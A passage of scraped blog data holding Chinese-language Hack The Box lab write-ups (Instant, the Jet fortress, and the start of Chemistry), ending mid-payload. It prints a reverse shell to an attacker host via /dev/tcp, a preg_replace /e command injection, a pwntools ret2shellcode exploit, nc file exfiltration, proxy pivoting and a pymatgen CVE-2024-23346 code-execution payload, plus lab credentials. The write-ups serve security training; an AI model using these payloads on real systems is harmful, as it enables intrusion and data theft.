不过由于这个算法比较耗时间，直接爆破应该出不来\n我在/opt里面发现了一个备份文件\n以及一个Github的解密脚本\n[github author=\u0026ldquo;Dimont-Gattsu\u0026rdquo; project=\u0026ldquo;SolarPuttyDecrypterPy\u0026rdquo;][/github]\n[root@kali] /home/kali/Instant/SolarPuttyDecrypterPy (main) ⚡ ❯ python decrypt2.py sessions-backup.dat /usr/share/wordlists/rockyou.txt 得到密码\nusername：root\rpassword：12**24nzC!r0c%q12 切换用户即可拿到root\nSummary #\rUser：首先进行APK分析，在网络配置文件中找到子域名信息，认证机制是使用的JWT token，为了找到JWT的生成密钥或者是示例token，在APK的包里面全局搜索得到了admin的token。在读取日志的路由上存在目录穿越导致任意文件读取，直接读取到了泄露用户的SSH私钥进行登录。\nRoot：感到不同寻常的是居然不是hashcat爆破密码，或许是因为PBKDF2-SHA256的爆破难度太高了，因为我是从根目录开始查找的，最开始的时候就关注到了这个session-backup.dat，但是在instant.db文件中又存在密码hash的泄露，导致我到处去寻找爆破方式。最后还是回到了Solar-Putty的备份文件，尝试使用脚本解密得到了密码。\n","date":"2024-12-20","externalUrl":null,"permalink":"/posts/2024/12/htb-instant/","section":"Posts","summary":"","title":"HTB-Instant","type":"posts"},{"content":"","date":"2024-12-19","externalUrl":null,"permalink":"/tags/fortresses/","section":"Tags","summary":"","title":"Fortresses","type":"tags"},{"content":"\rAbout #\r达到HTB的Hacker等级后可以进入Advanced Labs，本文是关于Fortresses（堡垒）中的Jet挑战\nConnect #\rNmap扫描结果如下\n[root@kali] /home/kali/Jet\r❯ nmap 10.13.37.10 -T4 -Pn -sS Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 15:06 CST\rNmap scan report for jet.com (10.13.37.10)\rHost is up (0.38s latency).\rNot shown: 994 closed tcp ports (reset)\rPORT STATE SERVICE\r22/tcp open ssh\r53/tcp open domain\r80/tcp open http\r2222/tcp open EtherNetIP-1\r5555/tcp open freeciv\r7777/tcp open cbt 使用浏览器打开80端口即可获得flag\nJET{s4n1ty_ch3ck} Digging in\u0026hellip; #\rDig Command #\rdig（Domain Information Groper）命令是一个非常有用的 DNS 查询工具，可以帮助渗透测试者收集目标域名的 DNS 信息，从而更好地了解目标的网络结构和潜在攻击面。\n以下是 dig 的一些常见用途：\n1. 解析域名\n获取目标域名对应的 IP 地址（A 记录）。 bash复制代码dig example.com\n用途：确定目标服务器的 IP 地址，为后续扫描或攻击做准备。\n2. 查询特定的 DNS 记录\n查询 MX（邮件交换）、NS（域名服务器）、CNAME（别名记录）等信息。 bash复制代码dig example.com MX # 查询邮件服务器 dig example.com NS # 查询权威域名服务器 dig example.com CNAME # 查询别名记录\n用途：识别目标网络中的关键服务或基础设施。\n3. 反向 DNS 查询\n使用目标 IP 查询其域名。 bash复制代码dig -x 192.0.2.1\n用途：帮助确定服务器的主机名，可能暴露出内部网络信息或与其他服务的关联。\nDig Jet #\rdig @10.13.37.10 -x 10.13.37.10 @符号用来指定dns主机，-x是反向查询域名\n[root@kali] /home/kali/Jet ❯ dig @10.13.37.10 -x 10.13.37.10 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.20.2-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; @10.13.37.10 -x 10.13.37.10\r; (1 server found)\r;; global options: +cmd\r;; Got answer:\r;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 57681\r;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\r;; WARNING: recursion requested but not available\r;; OPT PSEUDOSECTION:\r; EDNS: version: 0, flags:; udp: 1232\r; COOKIE: bfa9dd40818456c5010000006762761c5f63110cd3784e8d (good)\r;; QUESTION SECTION:\r;10.37.13.10.in-addr.arpa. IN PTR\r;; ANSWER SECTION:\r10.37.13.10.in-addr.arpa. 604800 IN PTR www.securewebinc.jet.\r;; Query time: 388 msec\r;; SERVER: 10.13.37.10#53(10.13.37.10) (UDP)\r;; WHEN: Wed Dec 18 15:13:16 CST 2024\r;; MSG SIZE rcvd: 115 发现存在一个www.securewebinc.jet的域名，将其添加到/etc/hosts\n进入到网站底部，找到flag\nJET{w3lc0me_4nd_h@v3_fun!} Going Deeper #\rdirsearch #\r使用direarch进行目录扫描，我发现了一个/js目录，在目录里面找到了一个secure.js\n[root@kali] /home/kali/Desktop ❯ dirsearch -u http://www.securewebinc.jet/js/ -t 50\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Desktop/reports/http_www.securewebinc.jet/_js__24-12-18_15-20-45.txt\rTarget: http://www.securewebinc.jet/\r[15:20:45] Starting: js/ [15:21:38] 200 - 1KB - /js/secure.js Task Completed 访问http://www.securewebinc.jet/js/secure.js，得到的内容是这样的👇\neval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59)); ChatGPT尝试解密后得到的原文👇，暴露出来一个新的路径，并且还有stats.php\nfunction getStats() {\r$.ajax({\rurl: \u0026#34;/dirb_safe_dir_rf9EmcEIx/admin/stats.php\u0026#34;,\rsuccess: function(result) {\r$(\u0026#39;#attacks\u0026#39;).html(result);\r},\rerror: function(result) {\rconsole.log(result);\r}\r});\r}\rgetStats();\rsetInterval(function() {\rgetStats();\r}, 10000); 针对这个/dirb_safe_dir_rf9EmcEIx/admin/目录再次进行扫描\n[root@kali] /home/kali/Jet\r❯ dirsearch -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/ -t 50 -i 200\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Desktop/reports/http_www.securewebinc.jet/_dirb_safe_dir_rf9EmcEIx_admin__24-12-18_15-27-56.txt\rTarget: http://www.securewebinc.jet/\r[15:27:56] Starting: dirb_safe_dir_rf9EmcEIx/admin/ [15:28:25] 200 - 0B - /dirb_safe_dir_rf9EmcEIx/admin/db.php [15:28:35] 200 - 3KB - /dirb_safe_dir_rf9EmcEIx/admin/login.php [15:28:51] 200 - 10B - /dirb_safe_dir_rf9EmcEIx/admin/stats.php Task Completed 进入login.php，View-Source得到flag\nJET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll} Bypassing Authentication #\rSQL Injection #\r进入登录页面，似乎用户名处存在SQL注入漏洞，而且是单引号闭合的，如下图所示。\n但是无法直接绕过登录，前端页面只有两种回显，可以考虑使用布尔（Bool）盲注\n将POST报文写入一个文件，然后使用SQLmap进行注入\n[root@kali] /home/kali/Jet ❯ sqlmap -r login.txt --dbs 存在jetadmin这个数据库\n[root@kali] /home/kali/Jet ❯ sqlmap -r login.txt -D jetadmin -T users -dump 在user表里存在admin的用户信息\n97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 使用John The Ripper进行密码爆破\n[root@kali] /home/kali/Jet ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 Using default input encoding: UTF-8\rLoaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])\rWarning: poor OpenMP scalability for this hash type, consider --fork=4\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rHackthesystem200 (?) 1g 0:00:00:00 DONE (2024-12-18 16:03) 1.818g/s 20256Kp/s 20256Kc/s 20256KC/s Hannah.rules..Galgenwaard\rUse the \u0026#34;--show --format=Raw-SHA256\u0026#34; options to display all of the cracked passwords reliably\rSession completed. 得到密码是：Hackthesystem200\n登录进去，得到flag\nJET{sQl_1nj3ct1ons_4r3_fun!} Command #\rPreg_match RCE #\r这个Dashboard里唯一能使用的功能就是email发送邮件\n并且可以预览自己的邮件内容，这里进行抓包查看POST的Body，为了方便查看我将PostData进行了urldecode\nPOST /dirb_safe_dir_rf9EmcEIx/admin/email.php HTTP/1.1\rHost: www.securewebinc.jet\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate, br\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 299\rOrigin: http://www.securewebinc.jet\rConnection: keep-alive\rReferer: http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php\rCookie: PHPSESSID=id2a0g01fkqtieui776n5seib3\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\rswearwords[/fuck/i]=make love\u0026amp;swearwords[/shit/i]=poop\u0026amp;swearwords[/ass/i]=behind\u0026amp;swearwords[/dick/i]=penis\u0026amp;swearwords[/whore/i]=escort\u0026amp;swearwords[/asshole/i]=bad person\u0026amp;to=123@qq.com\u0026amp;subject=123\u0026amp;message=\u0026lt;p\u0026gt;123\u0026lt;br\u0026gt;\u0026lt;/p\u0026gt;\u0026amp;_wysihtml5_mode=1 似乎里面有些参数会被替换？尝试这样发送邮件\n得到的结果👇可以看到邮件内容被替换了\n分析Post的参数可以发现，例如：swearwords[/ass/i]=behind，里面似乎是一个正则表达式，并且使ass忽略大小写转换为behind，如果将正则表达式改为/e修饰符那么就存在preg_replace的命令注入漏洞，这个也是在CTF中常见的考点。\n这里可以拿一个示例进行分析\npreg_replace（$badword， $replacement， $str）; 这里的badword也就是需要匹配的模式，这个是我们可以控制的\nreplacement也就是等号后面的值，str应该是Message中的内容\n如果将badword指定为比如说/ass/e，replacement指定为一个系统函数命令那么就可以执行命令\n如上图，手动去掉message的html标签，然后修改正则匹配和命令，然后Forward发送包，成功得到回显\n我们可以将替换文本设置为👇，进行反弹shell，方便操作\nsystem(\u0026#34;echo%20\u0026#39; YourBase64Here \u0026#39;|base64%20-d|bash\u0026#34;);\r# /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.xx.xx/200 0\u0026gt;\u0026amp;1 直接读取flag\nJET{pr3g_r3pl4c3_g3ts_y0u_pwn3d} Overflown #\r涉及到Pwn的知识我也不是很懂，就从我的角度进行分析。\n在/home目录下发现一个二进制文件leak\n使用nc将文件传出来看看\nwww-data@jet:/home$ nc 10.10.16.2 6666 \u0026lt; leak\r[root@kali] /home/kali ❯ nc -lvnp 6666 \u0026gt; leak checksec查看一下结构\n[root@kali] /home/kali/Desktop ❯ checksec leak [*] \u0026#39;/home/kali/Desktop/leak\u0026#39;\rArch: amd64-64-little\rRELRO: Partial RELRO\rStack: No canary found\rNX: NX unknown - GNU_STACK missing\rPIE: No PIE (0x400000)\rStack: Executable\rRWX: Has RWX segments\rStripped: No 查看IDA的伪代码，并没有看到其他的一些明显的system函数，应该是要自己写入\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rchar s[64]; // [rsp+0h] [rbp-40h] BYREF\r_init();\rprintf(\u0026#34;Oops, I\u0026#39;m leaking! %p\\n\u0026#34;, s);\rputs(aPwnMe);\rprintf(\u0026#34;\u0026gt; \u0026#34;);\rfgets(s, 512, stdin);\rreturn 0;\r} 最开始暴露出来了数组S的地址，使用Pwndbg进行调试，可以看到栈区是存在可读可写可执行的权限的。因此可以考虑栈溢出中的ret2shellcode\n大概思路就是，将Shellcode写入到数组S中，并且构造栈溢出使返回地址重新回到数组S端，并且继续执行Shellcode，至于执行完Shellcode后的返回地址，我们并不关心。可以对照下图看\nfrom pwn import *\rio = process(\u0026#39;./leak\u0026#39;)\rio.recvuntil(b\u0026#34;Oops, I\u0026#39;m leaking! \u0026#34;)\rleak_addr=int(io.recvuntil(\u0026#39;\\n\u0026#39;),16)\rshellcode = b\u0026#34;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\u0026#34;\rio.recvuntil(b\u0026#34;\u0026gt; \u0026#34;)\rio.sendline(shellcode.ljust(72,b\u0026#39;a\u0026#39;) +p64(leak_addr))\rio.interactive() 接下来就是要把leak二进制文件挂载到一个端口上，比较简单的做法是用nc -e进行挂载，不过这里的nc版本不对，不能用这个参数。询问ChatGPT，他给了我这个命令socat\nsocat TCP4-LISTEN:13145,reuseaddr,fork EXEC:/home/leak \u0026amp; 现在的问题就是，似乎从kali无法直接nc 10.13.37.10 13145端口，而在反弹shell里的是能nc 127.0.0.1 13145，大概率是不出网的问题，可以看到他只有两个内网IP\n既然反弹shell的机器能够访问我的kali，那么可以尝试使用frp搭建代理，然后代理访问内网挂载leak的端口，实现攻击\n[github author=\u0026ldquo;fatedier\u0026rdquo; project=\u0026ldquo;frp\u0026rdquo;][/github]\n下载amd64版本，然后如下配置，其中server_addr是kali的内网IP，remote_port是使用代理的端口\n[root@kali] /home/kali/Desktop/frp_0.61.0_linux_amd64 ❯ cat frps.ini [common]\rbind_port = 7000\r[root@kali] /home/kali/Desktop/frp_0.61.0_linux_amd64 ❯ cat frpc.ini\r[common]\rserver_addr = 10.10.xx.xx server_port = 7000 tls_enable = ture [plugin socks]\rtype = tcp plugin = socks5 remote_port = 46075 use_encryption = true\ruse_compression = true 将frpc和frpc.ini通过python的http模块上传到目标机器的/tmp目录下并且赋予权限\n先打开kali的服务端，再打开反弹shell的客户端\n修改/etc/proxychains4.conf如下\n挂载leak二进制文件\nwww-data@jet:/home$ socat TCP4-LISTEN:13145,reuseaddr,fork EXEC:/home/leak \u0026amp; 如图则表示代理搭建成功👇\n最后将poc.py修改为远程连接即可\nfrom pwn import *\r#io = process(\u0026#39;./leak\u0026#39;)\rio = remote(\u0026#34;192.168.122.100\u0026#34;,13145)\rio.recvuntil(b\u0026#34;Oops, I\u0026#39;m leaking! \u0026#34;)\rleak_addr=int(io.recvuntil(b\u0026#39;\\n\u0026#39;),16)\rshellcode = b\u0026#34;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\u0026#34;\rio.recvuntil(b\u0026#34;\u0026gt; \u0026#34;)\rio.sendline(shellcode+(72-len(shellcode))*b\u0026#39;a\u0026#39; +p64(leak_addr))\rio.interactive() 最后代理执行拿到flag\nJET{0v3rfL0w_f0r_73h_lulz} Secret Message #\r在alex目录下发现了一些文件，将其zip打包用nc传出来\n$ cd /home/alex\r$ zip -r alex.zip .\r$ nc 10.10.xx.xx 9855 \u0026lt; alex.zip\r[root@kali] /home/kali/Jet ❯ nc -lvnp 9855 \u0026gt; alex.zip 一共有三个文件\n[root@kali] /home/kali/Jet ❯ cat crypter.py import binascii\rdef makeList(stringVal):\rlist = []\rfor c in stringVal:\rlist.append(c)\rreturn list\rdef superCrypt(stringVal,keyVal):\rkeyPos = 0\rkey = makeList(keyVal)\rxored = []\rfor c in stringVal:\rxored.append(binascii.hexlify(chr(ord(c) ^ ord(keyVal[keyPos]))))\rif keyPos == len(key) - 1:\rkeyPos = 0\relse:\rkeyPos += 1\rhexVal = \u0026#39;\u0026#39;\rfor n in xored:\rhexVal += n\rreturn hexVal\rwith open(\u0026#39;message.txt\u0026#39;) as f:\rcontent = f.read()\rkey = sys.argv[1]\rwith open(\u0026#39;encrypted.txt\u0026#39;, \u0026#39;w\u0026#39;) as f:\routput = f.write(binascii.unhexlify(superCrypt(content, key))) encrypted.txt应该是加密后的文本，exploitme.zip需要密码才能解压\nChatGPT对上面的脚本解释：这段代码实现的是一种基于 异或（XOR）操作 的加密方式。\n由于没有密钥进行反异或，需要使用到一个工具Featherduster\n[github author=\u0026ldquo;nccgroup\u0026rdquo; project=\u0026ldquo;featherduster\u0026rdquo;][/github]\ngit clone https://github.com/nccgroup/featherduster\rdocker build -t featherduster . 解密得到如下文本，密钥是：securewebincrocks\nHello mate!\rFirst of all an important finding regarding our website: Login is prone to SQL injection! Ask the developers to fix it asap!\rRegarding your training material, I added the two binaries for the remote exploitation training in exploitme.zip. The password is the same we use to encrypt our communications.\rMake sure those binaries are kept safe!\rTo make your life easier I have already spawned instances of the vulnerable binaries listening on our server.\rThe ports are 5555 and 7777.\rHave fun and keep it safe!\rJET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}\rCheers - Alex\r-----------------------------------------------------------------------------\rThis email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately by e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited.\r----------------------------------------------------------------------------- Elasticity #\r使用nmap进行全端口扫描\n[root@kali] /home/kali/Jet ❯ nmap 10.13.37.10 -p- Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 19:22 CST\rStats: 0:02:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 26.57% done; ETC: 19:30 (0:05:51 remaining)\rNmap scan report for www.securewebinc.jet (10.13.37.10)\rHost is up (0.37s latency).\rNot shown: 65528 closed tcp ports (reset)\rPORT STATE SERVICE\r22/tcp open ssh\r53/tcp open domain\r80/tcp open http\r2222/tcp open EtherNetIP-1\r5555/tcp open freeciv\r7777/tcp open cbt\r9201/tcp open wap-wsp-wtp\rNmap done: 1 IP address (1 host up) scanned in 1291.19 seconds 查看内网端口开放的情况\nwww-data@jet:/$ netstat -tuln\rnetstat -tuln\rActive Internet connections (only servers)\rProto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:13145 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:953 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:25825 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:7777 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:6321 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:9201 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:5555 0.0.0.0:* LISTEN tcp 0 0 192.168.122.100:53 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:53 0.0.0.0:* LISTEN tcp6 0 0 :::22 :::* LISTEN tcp6 0 0 ::1:953 :::* LISTEN tcp6 0 0 :::25825 :::* LISTEN tcp6 0 0 127.0.0.1:9200 :::* LISTEN tcp6 0 0 127.0.0.1:9300 :::* LISTEN tcp6 0 0 :::53 :::* LISTEN udp 0 0 192.168.122.100:53 0.0.0.0:* udp 0 0 127.0.0.1:53 0.0.0.0:* udp6 0 0 :::53 :::* 可以注意到9200和9300端口开放，他们主要是ElasticSearch服务使用的端口\n由于绑定的是127.0.0.1这里使用代理也无法访问，需要在本地进行一次端口转发\nsocat tcp-listen:9999,reuseaddr,fork tcp:localhost:9300 \u0026amp; 然后我就无法正常Curl通那几个端口了，即使在反弹Shell里也无法连接，也不知道为什么？\n我这里就引用一下别人的Poc吧\nimport java.net.InetSocketAddress;\rimport java.net.InetAddress;\rimport java.util.Map;\rimport org.elasticsearch.action.admin.indices.exists.indices.IndicesExistsResponse;\rimport org.elasticsearch.action.admin.cluster.health.ClusterHealthResponse;\rimport org.elasticsearch.action.admin.indices.get.GetIndexResponse;\rimport org.elasticsearch.action.admin.indices.get.GetIndexRequest;\rimport org.elasticsearch.transport.client.PreBuiltTransportClient;\rimport org.elasticsearch.cluster.health.ClusterIndexHealth;\rimport org.elasticsearch.common.transport.TransportAddress;\rimport org.elasticsearch.client.transport.TransportClient;\rimport org.elasticsearch.action.search.SearchResponse;\rimport org.elasticsearch.client.IndicesAdminClient;\rimport org.elasticsearch.common.settings.Settings;\rimport org.elasticsearch.search.SearchHit;\rimport org.elasticsearch.client.Client;\rpublic class Program {\rpublic static void main(String[] args) {\rbyte[] ipAddr = new byte[]{10, 13, 37, 10};\rClient client = new PreBuiltTransportClient(Settings.EMPTY)\r.addTransportAddress(new TransportAddress(new InetSocketAddress(\u0026#34;10.13.37.10\u0026#34;, 9999)));\rSystem.out.println(client.toString());\rClusterHealthResponse healths = client.admin().cluster().prepareHealth().get();\rfor (ClusterIndexHealth health : healths.getIndices().values()) {\rString index = health.getIndex();\rSystem.out.println(index);\r}\rSearchResponse searchResponse = client.prepareSearch(\u0026#34;test\u0026#34;).execute().actionGet();\rSearchHit[] results = searchResponse.getHits().getHits();\rfor(SearchHit hit : results){\rString sourceAsString = hit.getSourceAsString();\rSystem.out.println(sourceAsString);\r}\rclient.close();\r}\r} 编译运行得到如下\n{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-13 08:31\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Just a heads up Rob\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;admin\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;no\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;Hey Rob - just so you know, that information you wanted has beensent.\u0026#34;\r}\r{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-10 07:00\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Maintenance\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;maintenance\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;no\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;Performance to our API has been reduced for a period of 3 hours. Services have been distributed across numerous suppliers, in order to reduce any future potential impact of another outage, as experienced yesterday\u0026#34;\r}\r{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-13 08:30\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Details for upgrades to EU-API-7\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;admin\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;yes\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;Hey Rob, you asked for the password to the EU-API-7 instance. You didn not want me to send it on Slack, so I am putting it in here as a draft document. Delete this once you have copied the message, and don _NOT_ tell _ANYONE_. We need a better way of sharing secrets. The password is purpl3un1c0rn_1969. -Jason JET{3sc4p3_s3qu3nc3s_4r3_fun}\u0026#34;\r}\r{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-13 13:32\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Upgrades complete\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;Maintenance\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;no\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;All upgrades are complete, and normal service resumed\u0026#34;\r}\r{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-09 15:13\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Server outage\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;outage\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;no\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;Due to an outage in one of our suppliers, services were unavailable for approximately 8 hours. This has now been resolved, and normal service resumed\u0026#34;\r}\r{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-13 13:40\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Thanks Jazz\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;admin\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;no\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;Thanks dude - all done. You can delete our little secret. Kind regards, Rob\u0026#34;\r}\r{\r\u0026#34;timestamp\u0026#34;: \u0026#34;2017-11-13 08:27\u0026#34;,\r\u0026#34;subject\u0026#34;: \u0026#34;Upgrades\u0026#34;,\r\u0026#34;category\u0026#34;: \u0026#34;maintenance\u0026#34;,\r\u0026#34;draft\u0026#34;: \u0026#34;no\u0026#34;,\r\u0026#34;body\u0026#34;: \u0026#34;An unscheduled maintenance period will occur at 12:00 today for approximately 1 hour. During this period, response times will be reduced while services have critical patches applied to them across all suppliers and instances\u0026#34;\r} End\u0026hellip;.. #\r第一次做Fortresses里面的题目，感觉综合性非常强，涉及到很多东西，不仅限于Web、Pwn，甚至还有一些密码的思路。后面还有几个Task，我觉得也不太好做了，这篇文章就到这里吧。\nBye~~😜\n","date":"2024-12-19","externalUrl":null,"permalink":"/posts/2024/12/fortresses-jet/","section":"Posts","summary":"","title":"Fortresses-Jet","type":"posts"},{"content":"","date":"2024-12-19","externalUrl":null,"permalink":"/categories/htb-fortresses/","section":"Categories","summary":"","title":"Htb-Fortresses","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali ❯ nmap Chemistry.htb -sS -Pn -T4 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 20:11 CST\rNmap scan report for Chemistry.htb (10.10.11.38)\rHost is up (0.10s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE\r22/tcp open ssh\r5000/tcp open upnp\rNmap done: 1 IP address (1 host up) scanned in 1.78 seconds 开放端口：22、5000\n进入http://chemistry.htb:5000/\n可以进行CIF晶体学信息文件(Crystallographic Information File)文件上传\n给出的示例文件内容是这样的\n[root@kali] /home/kali/Downloads ❯ cat example.cif data_Example\r_cell_length_a 10.00000\r_cell_length_b 10.00000\r_cell_length_b 10.00000\r_cell_angle_alpha 90.00000\r_cell_angle_beta 90.00000\r_cell_angle_gamma 90.00000\r_symmetry_space_group_name_H-M \u0026#39;P 1\u0026#39;\rloop_\r_atom_site_label\r_atom_site_fract_x\r_atom_site_fract_y\r_atom_site_fract_z\r_atom_site_occupancy\rH 0.00000 0.00000 0.00000 1\rO 0.50000 0.50000 0.50000 1 CVE-2024-23346 #\r经过Google搜寻这个CIF文件相关的CVE，我找到了这个👇\nCritical Security Flaw in Pymatgen Library (CVE-2024-23346) - vsociety (vicarius.io)\nArbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string · Advisory · materialsproject/pymatgen (github.com)\n在Github里给出的Poc原型是这样的\ndata_5yOhtAoR\r_audit_creation_date 2018-06-08\r_audit_creation_method \u0026#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit\u0026#34;\rloop_\r_parent_propagation_vector.id\r_parent_propagation_vector.kxkykz\rk1 [0 0 0]\r_space_group_magn.transform_BNS_Pp_abc \u0026#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[\u0026#34;__sub\u0026#34; + \u0026#34;classes__\u0026#34;]) () if d.__name__ == \u0026#34;BuiltinImporter\u0026#34;][0].load_module (\u0026#34;os\u0026#34;).system (\u0026#34;touch pwned\u0026#34;);0,0,0\u0026#39;\r_space_group_magn.number_BNS 62.448\r_space_group_magn.name_BNS \u0026#34;P n\u0026#39; m a\u0026#39; \u0026#34; 有效载荷就是下面的_space_group_magn那一段，因此仿照这个Poc构造一个反弹shell（注意单引号的转义，因为最外面是有一层单引号包裹的）\n[root@kali] /home/kali/Downloads ❯ cat example.cif data_Example\r_cell_length_a 10.00000\r_cell_length_b 10.00000\r_cell_length_c 10.00000\r_cell_angle_alpha 90.00000\r_cell_angle_beta 90.00000\r_cell_angle_gamma 90.00000\r_symmetry_space_group_name_H-M \u0026#39;P 1\u0026#39;\rloop_\r_atom_site_label\r_atom_site_fract_x\r_atom_site_fract_y\r_atom_site_fract_z\r_atom_site_occupancy\rH 0.00000 0.00000 0.00000 1\rO 0.50000 0.50000 0.50000 1\r_space_group_magn.transform_BNS_Pp_abc \u0026#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( 